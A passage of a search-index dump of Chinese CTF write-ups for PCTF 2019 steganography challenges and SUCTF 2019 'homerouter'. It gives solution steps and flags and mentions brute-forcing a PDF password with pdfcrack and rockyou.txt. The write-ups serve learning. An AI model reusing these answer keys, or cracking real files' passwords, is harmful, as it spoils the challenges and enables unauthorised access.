message ?? Hint: Dont look around, look closer. . . slowly . . . \u9898\u76ee\u5b58\u6863\uff1a recover.zip \u89e3\u51b3\u65b9\u6848 \u89e3\u538b\u540e\u6709\u4e00\u4e2a\u88ab\u52a0\u5bc6\u7684flag.pdf\u548c\u4e00\u4e2ascenery.jpeg\uff0c\u6ce8\u610f\u5230\u56fe\u7247\u6587\u4ef6\u5927\u5c0f\u548c\u5206\u8fa8\u7387\u4e0d\u662f\u5f88\u5339\u914d\uff0c\u56fe\u7247\u53ef\u80fd\u8fd8\u542b\u6709\u5176\u4ed6\u6587\u4ef6\u3002\u4e0d\u8fc7binwalk\u5e76\u6ca1\u6709\u53d1\u73b0\u66f4\u591a\u6587\u4ef6\u3002\u5c1d\u8bd5\u7528foremost\u63d0\u53d6\uff1a 1 foremost scenery . jpeg \u63d0\u53d6\u5230\u4e00\u4e2a\u5927\u5c0f\u6b63\u5e38\u7684jpeg\u56fe\u7247\uff0c\u4e8e\u662f\u548c\u539f\u6587\u4ef6\u5341\u516d\u8fdb\u5236\u5bf9\u6bd4\uff0c\u53d1\u73b0\u56fe\u7247\u662f\u4ece\u539f\u6587\u4ef6\u5934\u90e8\u63d0\u53d6\u51fa\u6765\u7684\u3002\u76f4\u63a5\u628a\u539f\u6587\u4ef6\u5934\u90e8\u662f\u63d0\u53d6\u51fa\u7684jpeg\u7684\u90e8\u5206\u5220\u9664\u3002\u4fdd\u5b58\u540e\uff0c\u53d1\u73b0\u65b0\u6587\u4ef6\u7684\u5934\u90e8\u7279\u5f81\u5f88\u50cfMP3\uff0c\u5c1d\u8bd5\u7528\u64ad\u653e\u5668\u6253\u5f00\uff0c\u80fd\u542c\u5230\u662fOneRepublic - Counting Stars\u7684\u7247\u6bb5\uff0c\u4e2d\u95f4\u5939\u6742\u4e86\u4e00\u6bb5\u8702\u9e23\u97f3\uff0c\u731c\u6d4b\u662f\u6469\u65af\u7535\u7801\uff1a .--. .- - .. . -. -.-. . .. ... - .... . -.- . -.-- .--. -.-. - ..-. -. ----- - .... ...-- .-. ...-- PATIENCEISTHEKEYPCTFN0TH3R3 PATIENCE IS THE KEY PCTF N0T H3R3 \u7136\u540e\u6211\u4eec\u5c31\u5361\u5728\u8fd9\u91cc\u4e86\uff0c\u4e0d\u7ba1\u662f\u770b\u8702\u9e23\u97f3\u4e2d\u95f4\u7684\u4e00\u5c0f\u6bb5\u7591\u4f3c\u4eba\u58f0\u7684\u7247\u6bb5\u7684\u9891\u8c31\u8fd8\u662f\u5176\u5b83\u601d\u8def\u90fd\u6ca1\u6709\u7ed3\u679c\u3002\u8d5b\u540e\u770b\u5230\u6709\u4e9b\u961f\u4f0d\u76f4\u63a5\u7528pdfcrack\u7206\u7834\uff0c\u4f3c\u4e4e\u7528\u7684\u662fKali Linux\u4e2d\u7684\u8bcd\u5178rockyou.txt\uff0c\u7ed3\u679c\u662f\uff1a 1 congratulations \u4e8e\u662f\u5c31\u80fd\u89e3\u5f00\uff1a 1 pctf { y0u_h34rd_m3_r1ght } \u540e\u7eed\u627e\u5230\u975e\u7206\u7834\u7684\u89e3\u6cd5\u518d\u66f4\u65b0\u8fd9\u91cc\u3002\u9644\u4e0a\u63d0\u53d6\u51fa\u7684\u4f3c\u4e4e\u662fmp3\u7684 \u6587\u4ef6 \u3002","title":"Slow Realization"},{"location":"ctf_writeup/pctf_2019/slow_realization/#_1","text":"Ryan's friend has hidden something in this image and challenged his to find it out. Can you help him recover the secret message ?? Hint: Dont look around, look closer. . . slowly . . . \u9898\u76ee\u5b58\u6863\uff1a recover.zip","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/slow_realization/#_2","text":"\u89e3\u538b\u540e\u6709\u4e00\u4e2a\u88ab\u52a0\u5bc6\u7684flag.pdf\u548c\u4e00\u4e2ascenery.jpeg\uff0c\u6ce8\u610f\u5230\u56fe\u7247\u6587\u4ef6\u5927\u5c0f\u548c\u5206\u8fa8\u7387\u4e0d\u662f\u5f88\u5339\u914d\uff0c\u56fe\u7247\u53ef\u80fd\u8fd8\u542b\u6709\u5176\u4ed6\u6587\u4ef6\u3002\u4e0d\u8fc7binwalk\u5e76\u6ca1\u6709\u53d1\u73b0\u66f4\u591a\u6587\u4ef6\u3002\u5c1d\u8bd5\u7528foremost\u63d0\u53d6\uff1a 1 foremost scenery . jpeg \u63d0\u53d6\u5230\u4e00\u4e2a\u5927\u5c0f\u6b63\u5e38\u7684jpeg\u56fe\u7247\uff0c\u4e8e\u662f\u548c\u539f\u6587\u4ef6\u5341\u516d\u8fdb\u5236\u5bf9\u6bd4\uff0c\u53d1\u73b0\u56fe\u7247\u662f\u4ece\u539f\u6587\u4ef6\u5934\u90e8\u63d0\u53d6\u51fa\u6765\u7684\u3002\u76f4\u63a5\u628a\u539f\u6587\u4ef6\u5934\u90e8\u662f\u63d0\u53d6\u51fa\u7684jpeg\u7684\u90e8\u5206\u5220\u9664\u3002\u4fdd\u5b58\u540e\uff0c\u53d1\u73b0\u65b0\u6587\u4ef6\u7684\u5934\u90e8\u7279\u5f81\u5f88\u50cfMP3\uff0c\u5c1d\u8bd5\u7528\u64ad\u653e\u5668\u6253\u5f00\uff0c\u80fd\u542c\u5230\u662fOneRepublic - Counting Stars\u7684\u7247\u6bb5\uff0c\u4e2d\u95f4\u5939\u6742\u4e86\u4e00\u6bb5\u8702\u9e23\u97f3\uff0c\u731c\u6d4b\u662f\u6469\u65af\u7535\u7801\uff1a .--. .- - .. . -. -.-. . .. ... - .... . -.- . -.-- .--. -.-. - ..-. -. ----- - .... ...-- .-. ...-- PATIENCEISTHEKEYPCTFN0TH3R3 PATIENCE IS THE KEY PCTF N0T H3R3 \u7136\u540e\u6211\u4eec\u5c31\u5361\u5728\u8fd9\u91cc\u4e86\uff0c\u4e0d\u7ba1\u662f\u770b\u8702\u9e23\u97f3\u4e2d\u95f4\u7684\u4e00\u5c0f\u6bb5\u7591\u4f3c\u4eba\u58f0\u7684\u7247\u6bb5\u7684\u9891\u8c31\u8fd8\u662f\u5176\u5b83\u601d\u8def\u90fd\u6ca1\u6709\u7ed3\u679c\u3002\u8d5b\u540e\u770b\u5230\u6709\u4e9b\u961f\u4f0d\u76f4\u63a5\u7528pdfcrack\u7206\u7834\uff0c\u4f3c\u4e4e\u7528\u7684\u662fKali Linux\u4e2d\u7684\u8bcd\u5178rockyou.txt\uff0c\u7ed3\u679c\u662f\uff1a 1 congratulations \u4e8e\u662f\u5c31\u80fd\u89e3\u5f00\uff1a 1 pctf { y0u_h34rd_m3_r1ght } \u540e\u7eed\u627e\u5230\u975e\u7206\u7834\u7684\u89e3\u6cd5\u518d\u66f4\u65b0\u8fd9\u91cc\u3002\u9644\u4e0a\u63d0\u53d6\u51fa\u7684\u4f3c\u4e4e\u662fmp3\u7684 \u6587\u4ef6 \u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/pctf_2019/welcome/","text":"\u9898\u76ee Do you think this is a normal image? No! Dig deeper to find out more..... \u9898\u76ee\u5b58\u6863\uff1a welcome.jpeg \u89e3\u51b3\u65b9\u6848 \u4e0b\u8f7d\u5230\u4e00\u4e2awelcome.jpeg\uff0c\u5c1d\u8bd5binwalk\u3002 \u5185\u542b\u4e00\u4e2azip\u6587\u4ef6\uff0c\u63d0\u53d6\u51fa\u6765\uff1a \u5f97\u5230\u4e24\u4e2azip\u6587\u4ef6\uff08\uff1f\uff09\uff0c2968.zip\u548cd.zip\uff0c\u5176\u5b9e\u89e3\u538b2968.zip\u540e\u8fd8\u662f\u5f97\u5230\u4e00\u4e2a\u548cd.zip\u54c8\u5e0c\u4e00\u6837\u7684\u6587\u4ef6\uff0c\u4e8e\u662f\u5173\u6ce8d.zip\u3002 \u89e3\u538bd.zip\uff0c\u5f97\u5230a.zip\u548c\u4e00\u4e2asecret.bmp\uff0c\u5176\u4e2da.zip\u91cc\u6709\u4e00\u4e2aa.png\u4f46\u662f\u538b\u7f29\u5305\u52a0\u5bc6\u4e86\u3002 \u5148\u5173\u6ce8secret.bmp\uff0c\u53ef\u80fd\u542b\u6709\u89e3\u5f00a.zip\u7684\u5bc6\u7801\u3002\u4f46\u662f\u56fe\u7247\u4e0d\u80fd\u6253\u5f00\uff0c\u4e8e\u662f\u5148\u770b\u770b\u5341\u516d\u8fdb\u5236\uff1a \u6709\u4e24\u4e2a\u7b49\u53f7\u5f15\u4eba\u6ce8\u610f\uff0c\u5148\u62ff\u51fa\u6765\u5c1d\u8bd5BASE64\u89e3\u5bc6\u3002 dGhlIHBhc3N3b3JkIGlzOiBoMzExMF90aDNyMyE== the password is: h3110_th3r3! \u62ff\u53bb\u89e3\u538ba.zip\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2aa.png\uff0c\u542f\u52a8StegSolve\u5c31\u5f88\u5bb9\u6613\u770b\u5230FLAG\uff1a","title":"Welcome"},{"location":"ctf_writeup/pctf_2019/welcome/#_1","text":"Do you think this is a normal image? No! Dig deeper to find out more..... \u9898\u76ee\u5b58\u6863\uff1a welcome.jpeg","title":"\u9898\u76ee"},{"location":"ctf_writeup/pctf_2019/welcome/#_2","text":"\u4e0b\u8f7d\u5230\u4e00\u4e2awelcome.jpeg\uff0c\u5c1d\u8bd5binwalk\u3002 \u5185\u542b\u4e00\u4e2azip\u6587\u4ef6\uff0c\u63d0\u53d6\u51fa\u6765\uff1a \u5f97\u5230\u4e24\u4e2azip\u6587\u4ef6\uff08\uff1f\uff09\uff0c2968.zip\u548cd.zip\uff0c\u5176\u5b9e\u89e3\u538b2968.zip\u540e\u8fd8\u662f\u5f97\u5230\u4e00\u4e2a\u548cd.zip\u54c8\u5e0c\u4e00\u6837\u7684\u6587\u4ef6\uff0c\u4e8e\u662f\u5173\u6ce8d.zip\u3002 \u89e3\u538bd.zip\uff0c\u5f97\u5230a.zip\u548c\u4e00\u4e2asecret.bmp\uff0c\u5176\u4e2da.zip\u91cc\u6709\u4e00\u4e2aa.png\u4f46\u662f\u538b\u7f29\u5305\u52a0\u5bc6\u4e86\u3002 \u5148\u5173\u6ce8secret.bmp\uff0c\u53ef\u80fd\u542b\u6709\u89e3\u5f00a.zip\u7684\u5bc6\u7801\u3002\u4f46\u662f\u56fe\u7247\u4e0d\u80fd\u6253\u5f00\uff0c\u4e8e\u662f\u5148\u770b\u770b\u5341\u516d\u8fdb\u5236\uff1a \u6709\u4e24\u4e2a\u7b49\u53f7\u5f15\u4eba\u6ce8\u610f\uff0c\u5148\u62ff\u51fa\u6765\u5c1d\u8bd5BASE64\u89e3\u5bc6\u3002 dGhlIHBhc3N3b3JkIGlzOiBoMzExMF90aDNyMyE== the password is: h3110_th3r3! \u62ff\u53bb\u89e3\u538ba.zip\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2aa.png\uff0c\u542f\u52a8StegSolve\u5c31\u5f88\u5bb9\u6613\u770b\u5230FLAG\uff1a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/suctf_2019/homerouter/","text":"\u9898\u76ee ISP\u53d1\u7ed9\u4e86\u767d\u83dc\u9171\u4e00\u53f0\u8def\u7531\u5668\uff0c\u8fd9\u662f\u8def\u7531\u5668\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u7684\u56fa\u4ef6\u3002\u600e\u4e48\u914d\u7f6e\u8fd9\u53f0\u8def\u7531\u5668\u5462\uff1f\u4f60\u80fd\u5e2e\u767d\u83dc\u9171\u7814\u7a76\u4e00\u4e0b\u5417\uff1f (\u7279\u6b8aflag\uff0c\u4ee5\u201cflag-\"\u5f00\u5934) 2019-08-18 12:32:43 homerouter hint: power your router and login to admin page 2019-08-18 16:23:18 [hint for homerouter] \u867d\u7136\u6ca1luci \u4f46\u662f\u5e76\u4e0d\u5f71\u54cd\u505a\u9898 \uff0cflag \u4e0d\u5728\u56fa\u4ef6\u91cc 2019-08-18 17:22:58 [hint for homerouter] \u5c0f\u4f19\u5b50\uff0c\u529e\u8fc7\u7535\u4fe1\u5bbd\u5e26\u561b\uff1f 2019-08-18 20:26:44 [hint for homerouter] \u6df1\u6316\u4e00\u4e0b\u6b63\u5e38\u7684openwrt\u56fa\u4ef6\u91cc\u4e0d\u5b58\u5728\u7684\u4e1c\u897f \u89e3\u51b3\u65b9\u6848 \u5c31\u5728\u4e00\u4e2a\u6708\u9ed1\u98ce\u9ad8\u7684\u4e2d\u5348... \u7136\u540e\u5230\u4e86\u508d\u665a\u7684\u65f6\u5019... ...\u8fd9\u4e0b\u6211\u5f7b\u5e95\u65b9\u4e86...\u867d\u7136\u6700\u540e\u8fd8\u662f\u8d5b\u540e\u624d\u641e\u5b9a\u7684\uff08\u6342\u8138.png\uff09\u3002 \u5148\u8bd5\u7740\u7528binwalk\u63d0\u53d6\u4e0b\u53d1\u7684\u8def\u7531\u5668\u56fa\u4ef6\uff0c\u80fd\u770b\u5230\u6587\u4ef6\uff1a \u8fd9\u4e2a\u65f6\u5019\u80fd\u770b\u5230\u6709\u4e2a\u90a3\u4e48\u4e0d\u5e38\u89c1\u7684\u4e1c\u897f\uff1a \u80fd\u770b\u5230\u914d\u7f6e\u6587\u4ef6\u91cc\u6709\u4e2a\u4e0d\u5bfb\u5e38\u7684\u4e1c\u897f\uff1a EasyCwmp is a GPLv2 open source implementation of the TR069 cwmp standard. \u8fd9\u4e2a\u65f6\u5019\u5c31\u5927\u6982\u80fd\u731c\u60f3\u8981\u53bb\u5229\u7528easycwmp\u6765\u8fde\u63a5\u4e00\u4e0b\u670d\u52a1\u5668\u770b\u770b\u4f1a\u6709\u4ec0\u4e48\u3002\u53ef\u4ee5\u9009\u62e9\u7528qemu\u6765\u8dd1\u56fa\u4ef6\uff0c\u6bd4\u8f83\u7701\u4e8b\u3002\u8fd8\u6709\u4e2a\u6bd4\u8f83\u4e0d\u90a3\u4e48\u9760\u8c31\u7684\u65b9\u6cd5\u5c31\u662f\u7528Burp\u4e00\u7c7b\u7684\u5de5\u5177\u6a21\u62df\u534f\u8bae\u53d1\u5305\u548c\u670d\u52a1\u5668\u4ea4\u4e92\u4e86\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\u6216\u8005Google\u3002 TR069\u4e4bCPE\u8207ACS\u7684Digest\u9a57\u8b49 TR-069 \u534f\u8bae\u5b8c\u6574\u7684\u901a\u4fe1\u8fc7\u7a0b \u7531\u4e8e\u8fd9\u8fb9\u4e0d\u77e5\u9053\u4e3a\u5565qemu\u6709\u70b9\u95ee\u9898\u8dd1\u4e0d\u8d77\u6765\uff0c\u4e8e\u662f\u4e4e\u62ff\u4e86\u4e00\u4e2a\u8def\u7531\u5668\u548c\u4e00\u4e2a\u8f6f\u8def\u7531\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4e0b\u9762\u90fd\u8bb0\u5f55\u4e86\u3002\u6bd4\u8d5b\u7684\u65f6\u5019\u662f\u7528\u7684\u4e00\u53f0\u5e73\u65f6\u6298\u817e\u7528\u7684Phicomm K2\uff0c\u4e4b\u524d\u5237\u4e86PandoraBox\uff0c\u4e8e\u662f\u76f4\u63a5SSH\u4e0a\u53bb\u3002 \u4f7f\u7528PandoraBox \u7531\u4e8ePandoraBox\u6709\u9884\u7f16\u8bd1\u7684\u5305\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\uff1a 1 2 opkg update opkg install easycwmp \u7136\u540e\u7f16\u8f91 /etc/config/easycwmp \u91cc\u7684acs\u76f8\u5173\u7684\u914d\u7f6e\u3002\u4e32\u53f7\u968f\u610f\u6539\u4e00\u4e2a\u5c31\u597d\u4e86\u3002 \u8fd9\u4e2a\u65f6\u5019\u5982\u679c\u5c1d\u8bd5\u76f4\u63a5\u8dd1 easycwmp -f -b \u7684\u8bdd\u53ef\u80fd\u4f1a\u6ca1\u6709\u53cd\u5e94\u5c31\u9000\u51fa\u4e86\uff0c\u597d\u50cf\u662f\u56e0\u4e3a\u8fd9\u91cc\u7684easycwmp\u81ea\u5df1\u5df2\u7ecf\u542f\u52a8\u4e86\u3002\u53ea\u597d ps \u770b\u4e00\u4e0b\u8fdb\u7a0b\uff0c\u7136\u540e\u628a\u5b83 kill \u6389\u3002 \u8fd9\u4e2a\u65f6\u5019\u5e94\u8be5\u80fd\u6b63\u5e38\u7528\u4e86\uff0c\u4e0d\u8fc7\u6211\u8fd9\u8fb9\u6ca1\u6709\u8f93\u51fa\uff0c\u50cf\u5361\u4f4f\u4e86\u4e00\u6837\uff0c\u641c\u4e86\u4e00\u4e0b\u53d1\u73b0\u5e94\u8be5\u53bb\u770bsyslog\u3002\u4e8e\u662f\u5148\u5f00\u7740\uff1a 1 logread -f \u7136\u540e\u6539\u4e86\u4e2a\u4e32\u53f7\u518d\u5f00 easycwmp -f -b \u3002\u5982\u679c\u53d1\u73b0\u65e5\u5fd7\u91cc\u51fa\u73b0 Error reading ca cert file \u7684\u8bdd\uff0c\u53ef\u4ee5\uff1a 1 opkg install ca-bundle \u7136\u540e\u91cd\u8bd5\u4e0a\u9762\u7684\u6b65\u9aa4\u3002\u5982\u679c /usr/share/easycwmp/functions \u4e0b\u7684\u6587\u4ef6\u91cc\u6709 system_set_password root \u7684\u8bdd\uff08\u6ca1\u6709\u7684\u8bdd\u5c31\u53bb\u628a\u56fa\u4ef6\u91cc\u7684 /usr/share/easycwmp/functions/system \u590d\u5236\u4e00\u4efd\u8fc7\u6765\uff09\uff0c\u5e94\u8be5\u80fd\u5728\u65e5\u5fd7\u91cc\u8bfb\u5230\uff1a\uff08\u5c31\u662f\u4e0b\u53d1\u914d\u7f6e\u4fee\u6539root\u5bc6\u7801\uff09 \u6700\u540e...\u63a5\u4e0b\u6765\u4f60\u53ef\u80fd\u4f1a\u56e0\u4e3a\u63a5\u4e0b\u6765\u767b\u5f55\u4e0d\u4e86SSH\u548cLuCI\u800c\u6000\u7591\u4eba\u751f\uff0c\u4e0d\u8981\u614c\uff0c\u56e0\u4e3a\u5b83\u5e2e\u4f60\u628a\u5bc6\u7801\u8bbe\u7f6e\u6210\u4e86flag... \u4f7f\u7528OpenWRT\u8f6f\u8def\u7531 \u8fd9\u4e2a\u53ea\u8981\u641e\u4e2a\u865a\u62df\u673a\u5c31\u53ef\u4ee5\u8dd1\uff0c\u6bd4\u8f83\u7b80\u5355\u3002\u6ca1\u6709\u7684\u8bdd\u53ef\u4ee5\u5148\u4e0b\u8f7d\u4e00\u4e0b\u955c\u50cf\uff1a Index of /snapshots/targets/x86/64/ \u3002\uff08\u5176\u5b9e\u4e5f\u53ef\u4ee5\u73a9\u73a9Koolshare\u7684LEDE\uff09 \u5177\u4f53\u5b89\u88c5\u65b9\u6cd5\u53ef\u4ee5\u770b\u8fd9\u91cc\uff1a Run OpenWrt as a VirtualBox virtual machine \u3002 \u4e3b\u8981\u5c31\u662f\u89e3\u538b\uff0c\u7136\u540e\u8f6c\u76d8\uff1a Linux 1 VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi Windows 1 'C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe' convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi \u7136\u540eVirtualBox\u65b0\u5efa\u865a\u62df\u673a\uff0c\u4f7f\u7528\u5df2\u5b58\u5728\u7684\u865a\u62df\u786c\u76d8\u6587\u4ef6\u5373\u53ef\u3002\u542f\u52a8\u524d\u9700\u8981\u4fdd\u8bc1\u7f51\u53611\u662f\u4ec5\u4e3b\u673a\uff08Host-only\uff09\u9002\u914d\u5668\uff0c\u7f51\u53612\u662fNAT\uff0c\u4e0d\u7136\u53ef\u80fd\u4e0a\u4e0d\u4e86\u7f51\u3002\uff08Koolshare\u7684\u597d\u50cf\u4e0d\u5927\u4e00\u6837\uff0c\u81ea\u5df1\u770b\u6587\u6863\u5427\uff09 \u8981\u662f\u542f\u52a8\u540e\u7f51\u7edc\u8fd8\u662f\u6709\u95ee\u9898\u5c31\uff1a 1 uci show network \u770b\u4e00\u4e0b\u3002\u53ef\u4ee5\uff1a 1 2 3 uci set network.lan.ipaddr = '192.168.56.2' uci commit reboot \u628a\u4e0d\u5bf9\u7684\u6539\u6389\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u6765\u88c5easycwmp\u4e86\u3002\u73b0\u5728\u6ca1\u6709\u9884\u7f16\u8bd1\u7684\u5305\u4e86\uff0c\u53ea\u597d\u81ea\u5df1\u7f16\u8bd1\u3002 x86_64/easycwmp_1.8.1 x86_64/libmicroxml i386/easycwmp_1.8.1 i386/libmicroxml \u8fd9\u91cc\u8d34\u4e00\u4e0b\u81ea\u5df1\u7f16\u8bd1\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u5bf9\u5e94\u67b6\u6784\u7684\uff0c\u7136\u540e\uff1a 1 opkg install xxx.ipk \u975e\u8981\u81ea\u5df1\u7f16\u8bd1\u7684\u8bdd\u5c31\u770b\u7740 \u8fd9\u91cc\uff08pivasoftware/easycwmp\uff09 \u7684README\u7f16\u8bd1\u5427\u3002\u9700\u8981\u5148 git clone https://github.com/openwrt/openwrt \uff0c\u7136\u540e\u628a easycwmp-openwrt \u548c microxml \u7684\u538b\u7f29\u5305\u89e3\u538b\u5230 openwrt/package \u4e0b\uff0c\u8fd9\u4e2a\u65f6\u5019\u5728 openwrt \u76ee\u5f55\u4e0b\u6267\u884c\uff1a 1 make menuconfig \u5e94\u8be5\u5c31\u80fd\u5728Utilities\u91cc\u627e\u5230easycwmp\u4e86\u3002\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u8fdb\u884c make \u5373\u53ef\u3002\u8981\u5f88\u957f\u65f6\u95f4\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e2d\u9700\u8981\u4e0b\u8f7d\u5f88\u591a\u4e1c\u897f\uff0c\u5efa\u8bae\u4e8b\u5148\u641e\u597d\u900f\u660e\u4ee3\u7406\u3002\uff08\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94\u67b6\u6784\u7684SDK\uff0c\u5177\u4f53\u770b\u6587\u6863\u5427\uff09 \u5b89\u88c5\u5b8c\u6210\u540e\u7684\u64cd\u4f5c\u5c31\u548c\u5728PandoraBox\u4e0b\u5dee\u4e0d\u591a\u4e86\uff0c\u5c31\u662f\u6539\u914d\u7f6e\uff0c\u7136\u540e\u8bfb\u65e5\u5fd7\uff0c\u518d\u542f\u52a8\u5ba2\u6237\u7aef\u5c31\u597d\u4e86\u3002","title":"homerouter"},{"location":"ctf_writeup/suctf_2019/homerouter/#_1","text":"ISP\u53d1\u7ed9\u4e86\u767d\u83dc\u9171\u4e00\u53f0\u8def\u7531\u5668\uff0c\u8fd9\u662f\u8def\u7531\u5668\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u7684\u56fa\u4ef6\u3002\u600e\u4e48\u914d\u7f6e\u8fd9\u53f0\u8def\u7531\u5668\u5462\uff1f\u4f60\u80fd\u5e2e\u767d\u83dc\u9171\u7814\u7a76\u4e00\u4e0b\u5417\uff1f (\u7279\u6b8aflag\uff0c\u4ee5\u201cflag-\"\u5f00\u5934) 2019-08-18 12:32:43 homerouter hint: power your router and login to admin page 2019-08-18 16:23:18 [hint for homerouter] \u867d\u7136\u6ca1luci \u4f46\u662f\u5e76\u4e0d\u5f71\u54cd\u505a\u9898 \uff0cflag \u4e0d\u5728\u56fa\u4ef6\u91cc 2019-08-18 17:22:58 [hint for homerouter] \u5c0f\u4f19\u5b50\uff0c\u529e\u8fc7\u7535\u4fe1\u5bbd\u5e26\u561b\uff1f 2019-08-18 20:26:44 [hint for homerouter] \u6df1\u6316\u4e00\u4e0b\u6b63\u5e38\u7684openwrt\u56fa\u4ef6\u91cc\u4e0d\u5b58\u5728\u7684\u4e1c\u897f","title":"\u9898\u76ee"},{"location":"ctf_writeup/suctf_2019/homerouter/#_2","text":"\u5c31\u5728\u4e00\u4e2a\u6708\u9ed1\u98ce\u9ad8\u7684\u4e2d\u5348... \u7136\u540e\u5230\u4e86\u508d\u665a\u7684\u65f6\u5019... ...\u8fd9\u4e0b\u6211\u5f7b\u5e95\u65b9\u4e86...\u867d\u7136\u6700\u540e\u8fd8\u662f\u8d5b\u540e\u624d\u641e\u5b9a\u7684\uff08\u6342\u8138.png\uff09\u3002 \u5148\u8bd5\u7740\u7528binwalk\u63d0\u53d6\u4e0b\u53d1\u7684\u8def\u7531\u5668\u56fa\u4ef6\uff0c\u80fd\u770b\u5230\u6587\u4ef6\uff1a \u8fd9\u4e2a\u65f6\u5019\u80fd\u770b\u5230\u6709\u4e2a\u90a3\u4e48\u4e0d\u5e38\u89c1\u7684\u4e1c\u897f\uff1a \u80fd\u770b\u5230\u914d\u7f6e\u6587\u4ef6\u91cc\u6709\u4e2a\u4e0d\u5bfb\u5e38\u7684\u4e1c\u897f\uff1a EasyCwmp is a GPLv2 open source implementation of the TR069 cwmp standard. \u8fd9\u4e2a\u65f6\u5019\u5c31\u5927\u6982\u80fd\u731c\u60f3\u8981\u53bb\u5229\u7528easycwmp\u6765\u8fde\u63a5\u4e00\u4e0b\u670d\u52a1\u5668\u770b\u770b\u4f1a\u6709\u4ec0\u4e48\u3002\u53ef\u4ee5\u9009\u62e9\u7528qemu\u6765\u8dd1\u56fa\u4ef6\uff0c\u6bd4\u8f83\u7701\u4e8b\u3002\u8fd8\u6709\u4e2a\u6bd4\u8f83\u4e0d\u90a3\u4e48\u9760\u8c31\u7684\u65b9\u6cd5\u5c31\u662f\u7528Burp\u4e00\u7c7b\u7684\u5de5\u5177\u6a21\u62df\u534f\u8bae\u53d1\u5305\u548c\u670d\u52a1\u5668\u4ea4\u4e92\u4e86\u3002 \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u67e5\u770b\u8fd9\u91cc\u6216\u8005Google\u3002 TR069\u4e4bCPE\u8207ACS\u7684Digest\u9a57\u8b49 TR-069 \u534f\u8bae\u5b8c\u6574\u7684\u901a\u4fe1\u8fc7\u7a0b \u7531\u4e8e\u8fd9\u8fb9\u4e0d\u77e5\u9053\u4e3a\u5565qemu\u6709\u70b9\u95ee\u9898\u8dd1\u4e0d\u8d77\u6765\uff0c\u4e8e\u662f\u4e4e\u62ff\u4e86\u4e00\u4e2a\u8def\u7531\u5668\u548c\u4e00\u4e2a\u8f6f\u8def\u7531\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4e0b\u9762\u90fd\u8bb0\u5f55\u4e86\u3002\u6bd4\u8d5b\u7684\u65f6\u5019\u662f\u7528\u7684\u4e00\u53f0\u5e73\u65f6\u6298\u817e\u7528\u7684Phicomm K2\uff0c\u4e4b\u524d\u5237\u4e86PandoraBox\uff0c\u4e8e\u662f\u76f4\u63a5SSH\u4e0a\u53bb\u3002","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"ctf_writeup/suctf_2019/homerouter/#pandorabox","text":"\u7531\u4e8ePandoraBox\u6709\u9884\u7f16\u8bd1\u7684\u5305\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\uff1a 1 2 opkg update opkg install easycwmp \u7136\u540e\u7f16\u8f91 /etc/config/easycwmp \u91cc\u7684acs\u76f8\u5173\u7684\u914d\u7f6e\u3002\u4e32\u53f7\u968f\u610f\u6539\u4e00\u4e2a\u5c31\u597d\u4e86\u3002 \u8fd9\u4e2a\u65f6\u5019\u5982\u679c\u5c1d\u8bd5\u76f4\u63a5\u8dd1 easycwmp -f -b \u7684\u8bdd\u53ef\u80fd\u4f1a\u6ca1\u6709\u53cd\u5e94\u5c31\u9000\u51fa\u4e86\uff0c\u597d\u50cf\u662f\u56e0\u4e3a\u8fd9\u91cc\u7684easycwmp\u81ea\u5df1\u5df2\u7ecf\u542f\u52a8\u4e86\u3002\u53ea\u597d ps \u770b\u4e00\u4e0b\u8fdb\u7a0b\uff0c\u7136\u540e\u628a\u5b83 kill \u6389\u3002 \u8fd9\u4e2a\u65f6\u5019\u5e94\u8be5\u80fd\u6b63\u5e38\u7528\u4e86\uff0c\u4e0d\u8fc7\u6211\u8fd9\u8fb9\u6ca1\u6709\u8f93\u51fa\uff0c\u50cf\u5361\u4f4f\u4e86\u4e00\u6837\uff0c\u641c\u4e86\u4e00\u4e0b\u53d1\u73b0\u5e94\u8be5\u53bb\u770bsyslog\u3002\u4e8e\u662f\u5148\u5f00\u7740\uff1a 1 logread -f \u7136\u540e\u6539\u4e86\u4e2a\u4e32\u53f7\u518d\u5f00 easycwmp -f -b \u3002\u5982\u679c\u53d1\u73b0\u65e5\u5fd7\u91cc\u51fa\u73b0 Error reading ca cert file \u7684\u8bdd\uff0c\u53ef\u4ee5\uff1a 1 opkg install ca-bundle \u7136\u540e\u91cd\u8bd5\u4e0a\u9762\u7684\u6b65\u9aa4\u3002\u5982\u679c /usr/share/easycwmp/functions \u4e0b\u7684\u6587\u4ef6\u91cc\u6709 system_set_password root \u7684\u8bdd\uff08\u6ca1\u6709\u7684\u8bdd\u5c31\u53bb\u628a\u56fa\u4ef6\u91cc\u7684 /usr/share/easycwmp/functions/system \u590d\u5236\u4e00\u4efd\u8fc7\u6765\uff09\uff0c\u5e94\u8be5\u80fd\u5728\u65e5\u5fd7\u91cc\u8bfb\u5230\uff1a\uff08\u5c31\u662f\u4e0b\u53d1\u914d\u7f6e\u4fee\u6539root\u5bc6\u7801\uff09 